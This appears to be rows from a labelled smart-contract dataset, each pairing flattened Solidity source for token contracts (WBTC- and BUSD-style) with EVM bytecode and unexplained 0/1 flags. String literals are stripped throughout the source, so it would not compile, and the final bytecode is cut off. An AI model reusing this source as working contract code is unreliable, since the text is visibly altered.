"pragma solidity 0.4.24;contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address _who) public view returns (uint256); function transfer(address _to, uint256 _value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value);}library SafeMath { function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) { if (_a == 0) { return 0; } c = _a * _b; assert(c / _a == _b); return c; } function div(uint256 _a, uint256 _b) internal pure returns (uint256) { return _a / _b; } function sub(uint256 _a, uint256 _b) internal pure returns (uint256) { assert(_b <= _a); return _a - _b; } function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) { c = _a + _b; assert(c >= _a); return c; }}contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) internal balances; uint256 internal totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_value <= balances[msg.sender]); require(_to != address(0)); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; }}contract ERC20 is ERC20Basic { function allowance(address _owner, address _spender) public view returns (uint256); function transferFrom(address _from, address _to, uint256 _value) public returns (bool); function approve(address _spender, uint256 _value) public returns (bool); event Approval( address indexed owner, address indexed spender, uint256 value );}contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom( address _from, address _to, uint256 _value ) public returns (bool) { require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); require(_to != address(0)); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance( address _owner, address _spender ) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval( address _spender, uint256 _addedValue ) public returns (bool) { allowed[msg.sender][_spender] = ( allowed[msg.sender][_spender].add(_addedValue)); emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval( address _spender, uint256 _subtractedValue ) public returns (bool) { uint256 oldValue = allowed[msg.sender][_spender]; if (_subtractedValue >= oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; }}contract DetailedERC20 is ERC20 { string public name; string public symbol; uint8 public decimals; constructor(string _name, string _symbol, uint8 _decimals) public { name = _name; symbol = _symbol; decimals = _decimals; }}contract Ownable { address public owner; event OwnershipRenounced(address indexed previousOwner); event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); constructor() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function renounceOwnership() public onlyOwner { emit OwnershipRenounced(owner); owner = address(0); } function transferOwnership(address _newOwner) public onlyOwner { _transferOwnership(_newOwner); } function _transferOwnership(address _newOwner) internal { require(_newOwner != address(0)); emit OwnershipTransferred(owner, _newOwner); owner = _newOwner; }}contract MintableToken is StandardToken, Ownable { event Mint(address indexed to, uint256 amount); event MintFinished(); bool public mintingFinished = false; modifier canMint() { require(!mintingFinished); _; } modifier hasMintPermission() { require(msg.sender == owner); _; } function mint( address _to, uint256 _amount ) public hasMintPermission canMint returns (bool) { totalSupply_ = totalSupply_.add(_amount); balances[_to] = balances[_to].add(_amount); emit Mint(_to, _amount); emit Transfer(address(0), _to, _amount); return true; } function finishMinting() public onlyOwner canMint returns (bool) { mintingFinished = true; emit MintFinished(); return true; }}contract BurnableToken is BasicToken { event Burn(address indexed burner, uint256 value); function burn(uint256 _value) public { _burn(msg.sender, _value); } function _burn(address _who, uint256 _value) internal { require(_value <= balances[_who]); balances[_who] = balances[_who].sub(_value); totalSupply_ = totalSupply_.sub(_value); emit Burn(_who, _value); emit Transfer(_who, address(0), _value); }}contract Pausable is Ownable { event Pause(); event Unpause(); bool public paused = false; modifier whenNotPaused() { require(!paused); _; } modifier whenPaused() { require(paused); _; } function pause() public onlyOwner whenNotPaused { paused = true; emit Pause(); } function unpause() public onlyOwner whenPaused { paused = false; emit Unpause(); }}contract PausableToken is StandardToken, Pausable { function transfer( address _to, uint256 _value ) public whenNotPaused returns (bool) { return super.transfer(_to, _value); } function transferFrom( address _from, address _to, uint256 _value ) public whenNotPaused returns (bool) { return super.transferFrom(_from, _to, _value); } function approve( address _spender, uint256 _value ) public whenNotPaused returns (bool) { return super.approve(_spender, _value); } function increaseApproval( address _spender, uint _addedValue ) public whenNotPaused returns (bool success) { return super.increaseApproval(_spender, _addedValue); } function decreaseApproval( address _spender, uint _subtractedValue ) public whenNotPaused returns (bool success) { return super.decreaseApproval(_spender, _subtractedValue); }}contract Claimable is Ownable { address public pendingOwner; modifier onlyPendingOwner() { require(msg.sender == pendingOwner); _; } function transferOwnership(address newOwner) public onlyOwner { pendingOwner = newOwner; } function claimOwnership() public onlyPendingOwner { emit OwnershipTransferred(owner, pendingOwner); owner = pendingOwner; pendingOwner = address(0); }}library SafeERC20 { function safeTransfer( ERC20Basic _token, address _to, uint256 _value ) internal { require(_token.transfer(_to, _value)); } function safeTransferFrom( ERC20 _token, address _from, address _to, uint256 _value ) internal { require(_token.transferFrom(_from, _to, _value)); } function safeApprove( ERC20 _token, address _spender, uint256 _value ) internal { require(_token.approve(_spender, _value)); }}contract CanReclaimToken is Ownable { using SafeERC20 for ERC20Basic; function reclaimToken(ERC20Basic _token) external onlyOwner { uint256 balance = _token.balanceOf(this); _token.safeTransfer(owner, balance); }}contract OwnableContract is CanReclaimToken, Claimable { } contract WBTC is StandardToken, DetailedERC20(, , 8), MintableToken, BurnableToken, PausableToken, OwnableContract { function burn(uint value) public onlyOwner { super.burn(value); } function finishMinting() public onlyOwner returns (bool) { return false; } function renounceOwnership() public onlyOwner { revert(); }}",0x60806040526004361061013d5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166305d2035b811461014257806306fdde031461016b578063095ea7b3146101f557806317ffc3201461021957806318160ddd1461023c57806323b872dd14610263578063313ce5671461028d5780633f4ba83a146102b857806340c10f19146102cd57806342966c68146102f15780634e71e0c8146103095780635c975abb1461031e578063661884631461033357806370a0823114610357578063715018a6146103785780637d64bcb41461038d5780638456cb59146103a25780638da5cb5b146103b757806395d89b41146103e8578063a9059cbb146103fd578063d73dd62314610421578063dd62ed3e14610445578063e30c39781461046c578063f2fde38b14610481575b600080fd5b34801561014e57600080fd5b506101576104a2565b604080519115158252519081900360200190f35b34801561017757600080fd5b506101806104c4565b6040805160208082528351818301528351919283929083019185019080838360005b838110156101ba5781810151838201526020016101a2565b50505050905090810190601f1680156101e75780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561020157600080fd5b50610157600160a060020a0360043516602435610552565b34801561022557600080fd5b5061023a600160a060020a036004351661057d565b005b34801561024857600080fd5b50610251610655565b60408051918252519081900360200190f35b34801561026f57600080fd5b50610157600160a060020a036004358116906024351660443561065b565b34801561029957600080fd5b506102a2610688565b6040805160ff9092168252519081900360200190f35b3480156102c457600080fd5b5061023a610691565b3480156102d957600080fd5b50610157600160a060020a0360043516602435610710565b3480156102fd57600080fd5b5061023a60043561081f565b34801561031557600080fd5b5061023a610847565b34801561032a57600080fd5b506101576108ef565b34801561033f57600080fd5b50610157600160a060020a03600435166024356108ff565b34801561036357600080fd5b50610251600160a060020a0360043516610923565b34801561038457600080fd5b5061023a61093e565b34801561039957600080fd5b506101576109c1565b3480156103ae57600080fd5b5061023a6109e6565b3480156103c357600080fd5b506103cc610a6a565b60408051600160a060020a039092168252519081900360200190f35b3480156103f457600080fd5b50610180610a7e565b34801561040957600080fd5b50610157600160a060020a0360043516602435610ad9565b34801561042d57600080fd5b50610157600160a060020a0360043516602435610afd565b34801561045157600080fd5b50610251600160a060020a0360043581169060243516610b21565b34801561047857600080fd5b506103cc610b4c565b34801561048d57600080fd5b5061023a600160a060020a0360043516610b5b565b6005547501000000000000000000000000000000000000000000900460ff1681565b6003805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561054a5780601f1061051f5761010080835404028352916020019161054a565b820191906000526020600020905b81548152906001019060200180831161052d57829003601f168201915b505050505081565b60055460009060b060020a900460ff161561056c57600080fd5b6105768383610ba6565b9392505050565b6005546000906101009004600160a060020a0316331461059c57600080fd5b604080517f70a082310000000000000000000000000000000000000000000000000000000081523060048201529051600160a060020a038416916370a082319160248083019260209291908290030181600087803b1580156105fd57600080fd5b505af1158015610611573d6000803e3d6000fd5b505050506040513d602081101561062757600080fd5b505160055490915061065190600160a060020a03848116916101009004168363ffffffff610c0c16565b5050565b60015490565b60055460009060b060020a900460ff161561067557600080fd5b610680848484610cc4565b949350505050565b60055460ff1681565b6005546101009004600160a060020a031633146106ad57600080fd5b60055460b060020a900460ff1615156106c557600080fd5b6005805476ff00000000000000000000000000000000000000000000191690556040517f7805862f689e2f13df9f062ff482ad3ad112aca9e0847911ed832e158c525b3390600090a1565b6005546000906101009004600160a060020a0316331461072f57600080fd5b6005547501000000000000000000000000000000000000000000900460ff161561075857600080fd5b60015461076b908363ffffffff610e2716565b600155600160a060020a038316600090815260208190526040902054610797908363ffffffff610e2716565b600160a060020a03841660008181526020818152604091829020939093558051858152905191927f0f6798a560793a54c3bcfe86a93cde1e73087d944c0ea20544137d412139688592918290030190a2604080518381529051600160a060020a0385169160009160008051602061119b8339815191529181900360200190a350600192915050565b6005546101009004600160a060020a0316331461083b57600080fd5b61084481610e3a565b50565b600654600160a060020a0316331461085e57600080fd5b600654600554604051600160a060020a0392831692610100909204909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a3600680546005805474ffffffffffffffffffffffffffffffffffffffff001916610100600160a060020a0384160217905573ffffffffffffffffffffffffffffffffffffffff19169055565b60055460b060020a900460ff1681565b60055460009060b060020a900460ff161561091957600080fd5b6105768383610e44565b600160a060020a031660009081526020819052604090205490565b6005546101009004600160a060020a0316331461095a57600080fd5b604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601f60248201527f72656e6f756e63696e67206f776e65727368697020697320626c6f636b656400604482015290519081900360640190fd5b6005546000906101009004600160a060020a031633146109e057600080fd5b50600090565b6005546101009004600160a060020a03163314610a0257600080fd5b60055460b060020a900460ff1615610a1957600080fd5b6005805476ff00000000000000000000000000000000000000000000191660b060020a1790556040517f6985a02210a168e66602d3235cb6db0e70f92b3ba4d376a33c0f3d9434bff62590600090a1565b6005546101009004600160a060020a031681565b6004805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561054a5780601f1061051f5761010080835404028352916020019161054a565b60055460009060b060020a900460ff1615610af357600080fd5b6105768383610f33565b60055460009060b060020a900460ff1615610b1757600080fd5b6105768383611000565b600160a060020a03918216600090815260026020908152604080832093909416825291909152205490565b600654600160a060020a031681565b6005546101009004600160a060020a03163314610b7757600080fd5b6006805473ffffffffffffffffffffffffffffffffffffffff1916600160a060020a0392909216919091179055565b336000818152600260209081526040808320600160a060020a038716808552908352818420869055815186815291519394909390927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925928290030190a350600192915050565b82600160a060020a031663a9059cbb83836040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083600160a060020a0316600160a060020a0316815260200182815260200192505050602060405180830381600087803b158015610c8857600080fd5b505af1158015610c9c573d6000803e3d6000fd5b505050506040513d6020811015610cb257600080fd5b50511515610cbf57600080fd5b505050565b600160a060020a038316600090815260208190526040812054821115610ce957600080fd5b600160a060020a0384166000908152600260209081526040808320338452909152902054821115610d1957600080fd5b600160a060020a0383161515610d2e57600080fd5b600160a060020a038416600090815260208190526040902054610d57908363ffffffff61109916565b600160a060020a038086166000908152602081905260408082209390935590851681522054610d8c908363ffffffff610e2716565b600160a060020a03808516600090815260208181526040808320949094559187168152600282528281203382529091522054610dce908363ffffffff61109916565b600160a060020a038086166000818152600260209081526040808320338452825291829020949094558051868152905192871693919260008051602061119b833981519152929181900390910190a35060019392505050565b81810182811015610e3457fe5b92915050565b61084433826110ab565b336000908152600260209081526040808320600160a060020a0386168452909152812054808310610e9857336000908152600260209081526040808320600160a060020a0388168452909152812055610ecd565b610ea8818463ffffffff61109916565b336000908152600260209081526040808320600160a060020a03891684529091529020555b336000818152600260209081526040808320600160a060020a0389168085529083529281902054815190815290519293927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929181900390910190a35060019392505050565b33600090815260208190526040812054821115610f4f57600080fd5b600160a060020a0383161515610f6457600080fd5b33600090815260208190526040902054610f84908363ffffffff61109916565b3360009081526020819052604080822092909255600160a060020a03851681522054610fb6908363ffffffff610e2716565b600160a060020a0384166000818152602081815260409182902093909355805185815290519192339260008051602061119b8339815191529281900390910190a350600192915050565b336000908152600260209081526040808320600160a060020a0386168452909152812054611034908363ffffffff610e2716565b336000818152600260209081526040808320600160a060020a0389168085529083529281902085905580519485525191937f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929081900390910190a350600192915050565b6000828211156110a557fe5b50900390565b600160a060020a0382166000908152602081905260409020548111156110d057600080fd5b600160a060020a0382166000908152602081905260409020546110f9908263ffffffff61109916565b600160a060020a038316600090815260208190526040902055600154611125908263ffffffff61109916565b600155604080518281529051600160a060020a038416917fcc16f5dbb4873280815c1ee09dbd06736cffcc184412cf7a71a0fdb75d397ca5919081900360200190a2604080518281529051600091600160a060020a0385169160008051602061119b8339815191529181900360200190a350505600ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3efa165627a7a72305820a1e0f5cdc96081f44eea73f352e7ef8fbfbacd306ec0f0b7275c9752d31fbe320029,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0
"pragma solidity 0.4.24;library SafeMath { function sub(uint256 a, uint256 b) internal pure returns (uint256) { require(b <= a); uint256 c = a - b; return c; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a); return c; }}pragma solidity 0.4.24;pragma experimental ;contract BUSDImplementation { using SafeMath for uint256; bool private initialized = false; mapping(address => uint256) internal balances; uint256 internal totalSupply_; string public constant name = ; string public constant symbol = ; uint8 public constant decimals = 18; mapping(address => mapping(address => uint256)) internal allowed; address public owner; address public proposedOwner; bool public paused = false; address public assetProtectionRole; mapping(address => bool) internal frozen; address public supplyController; address public betaDelegateWhitelister; mapping(address => bool) internal betaDelegateWhitelist; mapping(address => uint256) internal nextSeqs; string constant internal EIP191_HEADER = ; bytes32 constant internal EIP712_DOMAIN_SEPARATOR_SCHEMA_HASH = keccak256( ); bytes32 constant internal EIP712_DELEGATED_TRANSFER_SCHEMA_HASH = keccak256( ); bytes32 public EIP712_DOMAIN_HASH; event Transfer(address indexed from, address indexed to, uint256 value); event Approval( address indexed owner, address indexed spender, uint256 value ); event OwnershipTransferProposed( address indexed currentOwner, address indexed proposedOwner ); event OwnershipTransferDisregarded( address indexed oldProposedOwner ); event OwnershipTransferred( address indexed oldOwner, address indexed newOwner ); event Pause(); event Unpause(); event AddressFrozen(address indexed addr); event AddressUnfrozen(address indexed addr); event FrozenAddressWiped(address indexed addr); event AssetProtectionRoleSet ( address indexed oldAssetProtectionRole, address indexed newAssetProtectionRole ); event SupplyIncreased(address indexed to, uint256 value); event SupplyDecreased(address indexed from, uint256 value); event SupplyControllerSet( address indexed oldSupplyController, address indexed newSupplyController ); event BetaDelegatedTransfer( address indexed from, address indexed to, uint256 value, uint256 seq, uint256 fee ); event BetaDelegateWhitelisterSet( address indexed oldWhitelister, address indexed newWhitelister ); event BetaDelegateWhitelisted(address indexed newDelegate); event BetaDelegateUnwhitelisted(address indexed oldDelegate); function initialize() public { require(!initialized, ); owner = msg.sender; proposedOwner = address(0); assetProtectionRole = address(0); totalSupply_ = 0; supplyController = msg.sender; initialized = true; } constructor() public { initialize(); pause(); initializeDomainSeparator(); } function initializeDomainSeparator() public { EIP712_DOMAIN_HASH = keccak256(abi.encodePacked( EIP712_DOMAIN_SEPARATOR_SCHEMA_HASH, keccak256(bytes(name)), bytes32(address(this)) )); } function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) { require(_to != address(0), ); require(!frozen[_to] && !frozen[msg.sender], ); require(_value <= balances[msg.sender], ); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _addr) public view returns (uint256) { return balances[_addr]; } function transferFrom( address _from, address _to, uint256 _value ) public whenNotPaused returns (bool) { require(_to != address(0), ); require(!frozen[_to] && !frozen[_from] && !frozen[msg.sender], ); require(_value <= balances[_from], ); require(_value <= allowed[_from][msg.sender], ); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) { require(!frozen[_spender] && !frozen[msg.sender], ); allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance( address _owner, address _spender ) public view returns (uint256) { return allowed[_owner][_spender]; } modifier onlyOwner() { require(msg.sender == owner, ); _; } function proposeOwner(address _proposedOwner) public onlyOwner { require(_proposedOwner != address(0), ); require(msg.sender != _proposedOwner, ); proposedOwner = _proposedOwner; emit OwnershipTransferProposed(owner, proposedOwner); } function disregardProposeOwner() public { require(msg.sender == proposedOwner || msg.sender == owner, ); require(proposedOwner != address(0), ); address _oldProposedOwner = proposedOwner; proposedOwner = address(0); emit OwnershipTransferDisregarded(_oldProposedOwner); } function claimOwnership() public { require(msg.sender == proposedOwner, ); address _oldOwner = owner; owner = proposedOwner; proposedOwner = address(0); emit OwnershipTransferred(_oldOwner, owner); } function reclaimBUSD() external onlyOwner { uint256 _balance = balances[this]; balances[this] = 0; balances[owner] = balances[owner].add(_balance); emit Transfer(this, owner, _balance); } modifier whenNotPaused() { require(!paused, ); _; } function pause() public onlyOwner { require(!paused, ); paused = true; emit Pause(); } function unpause() public onlyOwner { require(paused, ); paused = false; emit Unpause(); } function setAssetProtectionRole(address _newAssetProtectionRole) public { require(msg.sender == assetProtectionRole || msg.sender == owner, ); emit AssetProtectionRoleSet(assetProtectionRole, _newAssetProtectionRole); assetProtectionRole = _newAssetProtectionRole; } modifier onlyAssetProtectionRole() { require(msg.sender == assetProtectionRole, ); _; } function freeze(address _addr) public onlyAssetProtectionRole { require(!frozen[_addr], ); frozen[_addr] = true; emit AddressFrozen(_addr); } function unfreeze(address _addr) public onlyAssetProtectionRole { require(frozen[_addr], ); frozen[_addr] = false; emit AddressUnfrozen(_addr); } function wipeFrozenAddress(address _addr) public onlyAssetProtectionRole { require(frozen[_addr], ); uint256 _balance = balances[_addr]; balances[_addr] = 0; totalSupply_ = totalSupply_.sub(_balance); emit FrozenAddressWiped(_addr); emit SupplyDecreased(_addr, _balance); emit Transfer(_addr, address(0), _balance); } function isFrozen(address _addr) public view returns (bool) { return frozen[_addr]; } function setSupplyController(address _newSupplyController) public { require(msg.sender == supplyController || msg.sender == owner, ); require(_newSupplyController != address(0), ); emit SupplyControllerSet(supplyController, _newSupplyController); supplyController = _newSupplyController; } modifier onlySupplyController() { require(msg.sender == supplyController, ); _; } function increaseSupply(uint256 _value) public onlySupplyController returns (bool success) { totalSupply_ = totalSupply_.add(_value); balances[supplyController] = balances[supplyController].add(_value); emit SupplyIncreased(supplyController, _value); emit Transfer(address(0), supplyController, _value); return true; } function decreaseSupply(uint256 _value) public onlySupplyController returns (bool success) { require(_value <= balances[supplyController], ); balances[supplyController] = balances[supplyController].sub(_value); totalSupply_ = totalSupply_.sub(_value); emit SupplyDecreased(supplyController, _value); emit Transfer(supplyController, address(0), _value); return true; } function nextSeqOf(address target) public view returns (uint256) { return nextSeqs[target]; } function betaDelegatedTransfer( bytes sig, address to, uint256 value, uint256 fee, uint256 seq, uint256 deadline ) public returns (bool) { require(sig.length == 65, ); bytes32 r; bytes32 s; uint8 v; assembly { r := mload(add(sig, 32)) s := mload(add(sig, 64)) v := byte(0, mload(add(sig, 96))) } require(_betaDelegatedTransfer(r, s, v, to, value, fee, seq, deadline), ); return true; } function _betaDelegatedTransfer( bytes32 r, bytes32 s, uint8 v, address to, uint256 value, uint256 fee, uint256 seq, uint256 deadline ) internal whenNotPaused returns (bool) { require(betaDelegateWhitelist[msg.sender], ); require(value > 0 || fee > 0, ); require(block.number <= deadline, ); require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, ); require(v == 27 || v == 28, ); bytes32 delegatedTransferHash = keccak256(abi.encodePacked( EIP712_DELEGATED_TRANSFER_SCHEMA_HASH, bytes32(to), value, fee, seq, deadline )); bytes32 hash = keccak256(abi.encodePacked(EIP191_HEADER, EIP712_DOMAIN_HASH, delegatedTransferHash)); address _from = ecrecover(hash, v, r, s); require(_from != address(0), ); require(to != address(0), ); require(!frozen[to] && !frozen[_from] && !frozen[msg.sender], ); require(value.add(fee) <= balances[_from], ); require(nextSeqs[_from] == seq, ); nextSeqs[_from] = nextSeqs[_from].add(1); balances[_from] = balances[_from].sub(value.add(fee)); if (fee != 0) { balances[msg.sender] = balances[msg.sender].add(fee); emit Transfer(_from, msg.sender, fee); } balances[to] = balances[to].add(value); emit Transfer(_from, to, value); emit BetaDelegatedTransfer(_from, to, value, seq, fee); return true; } function betaDelegatedTransferBatch( bytes32[] r, bytes32[] s, uint8[] v, address[] to, uint256[] value, uint256[] fee, uint256[] seq, uint256[] deadline ) public returns (bool) { require(r.length == s.length && r.length == v.length && r.length == to.length && r.length == value.length, ); require(r.length == fee.length && r.length == seq.length && r.length == deadline.length, ); for (uint i = 0; i < r.length; i++) { require( _betaDelegatedTransfer(r[i], s[i], v[i], to[i], value[i], fee[i], seq[i], deadline[i]), ); } return true; } function isWhitelistedBetaDelegate(address _addr) public view returns (bool) { return betaDelegateWhitelist[_addr]; } function setBetaDelegateWhitelister(address _newWhitelister) public { require(msg.sender == betaDelegateWhitelister || msg.sender == owner, ); betaDelegateWhitelister = _newWhitelister; emit BetaDelegateWhitelisterSet(betaDelegateWhitelister, _newWhitelister); } modifier onlyBetaDelegateWhitelister() { require(msg.sender == betaDelegateWhitelister, ); _; } function whitelistBetaDelegate(address _addr) public onlyBetaDelegateWhitelister { require(!betaDelegateWhitelist[_addr], ); betaDelegateWhitelist[_addr] = true; emit BetaDelegateWhitelisted(_addr); } function unwhitelistBetaDelegate(address _addr) public onlyBetaDelegateWhitelister { require(betaDelegateWhitelist[_addr], ); betaDelegateWhitelist[_addr] = false; emit BetaDelegateUnwhitelisted(_addr); }}",0x6080604052600436106101e25763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166303acb44881146101e757806306fdde03146101fe578063095ea7b3146102885780630a91b601146102c057806318160ddd146102f15780631b6705611461031857806321ab11f7146104fc57806323b872dd146105755780632ff791611461059f578063313ce567146105b45780633f4ba83a146105df57806345c8b1a6146105f45780634e71e0c81461061557806352875bc31461062a5780635c975abb1461064b57806370a08231146106605780638129fc1c146106815780638456cb591461069657806389f72c21146106ab5780638ceed9cb146106cc5780638d1fdf2f146106ed5780638da5cb5b1461070e57806395d89b411461072357806397d60d561461073857806398e52f9a14610759578063a7d87ed014610771578063a9059cbb14610792578063ac69275c146107b6578063b5ed298a146107d7578063b921e163146107f8578063c4f62fee14610810578063d153b60c14610825578063d990c6181461083a578063dd62ed3e1461085b578063e2f72f0314610882578063e306f779146108a3578063e5839836146108b8578063e7ba1012146108d9578063ebc93aaf146108ee575b600080fd5b3480156101f357600080fd5b506101fc610903565b005b34801561020a57600080fd5b50610213610a54565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561024d578181015183820152602001610235565b50505050905090810190601f16801561027a5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561029457600080fd5b506102ac600160a060020a0360043516602435610a8b565b604080519115158252519081900360200190f35b3480156102cc57600080fd5b506102d5610bc2565b60408051600160a060020a039092168252519081900360200190f35b3480156102fd57600080fd5b50610306610bd1565b60408051918252519081900360200190f35b34801561032457600080fd5b50604080516020600480358082013583810280860185019096528085526102ac95369593946024949385019291829185019084908082843750506040805187358901803560208181028481018201909552818452989b9a998901989297509082019550935083925085019084908082843750506040805187358901803560208181028481018201909552818452989b9a998901989297509082019550935083925085019084908082843750506040805187358901803560208181028481018201909552818452989b9a998901989297509082019550935083925085019084908082843750506040805187358901803560208181028481018201909552818452989b9a998901989297509082019550935083925085019084908082843750506040805187358901803560208181028481018201909552818452989b9a998901989297509082019550935083925085019084908082843750506040805187358901803560208181028481018201909552818452989b9a998901989297509082019550935083925085019084908082843750506040805187358901803560208181028481018201909552818452989b9a998901989297509082019550935083925085019084908082843750949750610bd79650505050505050565b34801561050857600080fd5b506040805160206004803580820135601f81018490048402850184019095528484526102ac94369492936024939284019190819084018382808284375094975050600160a060020a0385351695505050602083013592604081013592506060810135915060800135610e14565b34801561058157600080fd5b506102ac600160a060020a0360043581169060243516604435610ef0565b3480156105ab57600080fd5b506101fc61122b565b3480156105c057600080fd5b506105c9611399565b6040805160ff9092168252519081900360200190f35b3480156105eb57600080fd5b506101fc61139e565b34801561060057600080fd5b506101fc600160a060020a036004351661149a565b34801561062157600080fd5b506101fc6115b7565b34801561063657600080fd5b506101fc600160a060020a036004351661167d565b34801561065757600080fd5b506102ac6117d8565b34801561066c57600080fd5b50610306600160a060020a03600435166117e8565b34801561068d57600080fd5b506101fc611803565b3480156106a257600080fd5b506101fc6118a4565b3480156106b757600080fd5b50610306600160a060020a03600435166119a5565b3480156106d857600080fd5b506101fc600160a060020a03600435166119c0565b3480156106f957600080fd5b506101fc600160a060020a0360043516611abb565b34801561071a57600080fd5b506102d5611bda565b34801561072f57600080fd5b50610213611be9565b34801561074457600080fd5b506101fc600160a060020a0360043516611c20565b34801561076557600080fd5b506102ac600435611ce9565b34801561077d57600080fd5b506102ac600160a060020a0360043516611e98565b34801561079e57600080fd5b506102ac600160a060020a0360043516602435611eb6565b3480156107c257600080fd5b506101fc600160a060020a03600435166120eb565b3480156107e357600080fd5b506101fc600160a060020a036004351661220a565b34801561080457600080fd5b506102ac600435612398565b34801561081c57600080fd5b506102d56124d3565b34801561083157600080fd5b506102d56124e2565b34801561084657600080fd5b506101fc600160a060020a03600435166124f1565b34801561086757600080fd5b50610306600160a060020a036004358116906024351661260e565b34801561088e57600080fd5b506101fc600160a060020a0360043516612639565b3480156108af57600080fd5b506103066127ea565b3480156108c457600080fd5b506102ac600160a060020a03600435166127f0565b3480156108e557600080fd5b506102d561280e565b3480156108fa57600080fd5b506101fc61281d565b600554600090600160a060020a03163314806109295750600454600160a060020a031633145b151561097f576040805160e560020a62461bcd02815260206004820152601b60248201527f6f6e6c792070726f706f7365644f776e6572206f72206f776e65720000000000604482015290519081900360640190fd5b600554600160a060020a03161515610a07576040805160e560020a62461bcd02815260206004820152603b60248201527f63616e206f6e6c792064697372656761726420612070726f706f736564206f7760448201527f6e65722074686174207761732070726576696f75736c79207365740000000000606482015290519081900360840190fd5b5060058054600160a060020a03198116909155604051600160a060020a039091169081907f24f4590b0077912a4db89e7430de7986175c27bede1b47ee039e3b421c2e798e90600090a250565b60408051808201909152600b81527f42696e616e636520555344000000000000000000000000000000000000000000602082015281565b60055460009060a060020a900460ff1615610ade576040805160e560020a62461bcd02815260206004820152600d60248201526000805160206132d5833981519152604482015290519081900360640190fd5b600160a060020a03831660009081526007602052604090205460ff16158015610b1757503360009081526007602052604090205460ff16155b1515610b5b576040805160e560020a62461bcd02815260206004820152600e60248201526000805160206132b5833981519152604482015290519081900360640190fd5b336000818152600360209081526040808320600160a060020a03881680855290835292819020869055805186815290519293927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929181900390910190a350600192915050565b600654600160a060020a031681565b60025490565b60008088518a51148015610bec575087518a51145b8015610bf9575086518a51145b8015610c06575085518a51145b1515610c5c576040805160e560020a62461bcd02815260206004820152600f60248201527f6c656e677468206d69736d617463680000000000000000000000000000000000604482015290519081900360640190fd5b84518a51148015610c6e575083518a51145b8015610c7b575082518a51145b1515610cd1576040805160e560020a62461bcd02815260206004820152600f60248201527f6c656e677468206d69736d617463680000000000000000000000000000000000604482015290519081900360640190fd5b5060005b8951811015610e0457610da68a82815181101515610cef57fe5b906020019060200201518a83815181101515610d0757fe5b906020019060200201518a84815181101515610d1f57fe5b906020019060200201518a85815181101515610d3757fe5b906020019060200201518a86815181101515610d4f57fe5b906020019060200201518a87815181101515610d6757fe5b906020019060200201518a88815181101515610d7f57fe5b906020019060200201518a89815181101515610d9757fe5b906020019060200201516128f7565b1515610dfc576040805160e560020a62461bcd02815260206004820152600f60248201527f6661696c6564207472616e736665720000000000000000000000000000000000604482015290519081900360640190fd5b600101610cd5565b5060019998505050505050505050565b60008060008089516041141515610e75576040805160e560020a62461bcd02815260206004820152601f60248201527f7369676e61747572652073686f756c642068617665206c656e67746820363500604482015290519081900360640190fd5b50505060208701516040880151606089015160001a610e9a8383838c8c8c8c8c6128f7565b1515610e04576040805160e560020a62461bcd02815260206004820152600f60248201527f6661696c6564207472616e736665720000000000000000000000000000000000604482015290519081900360640190fd5b60055460009060a060020a900460ff1615610f43576040805160e560020a62461bcd02815260206004820152600d60248201526000805160206132d5833981519152604482015290519081900360640190fd5b600160a060020a0383161515610fa3576040805160e560020a62461bcd0281526020600482015260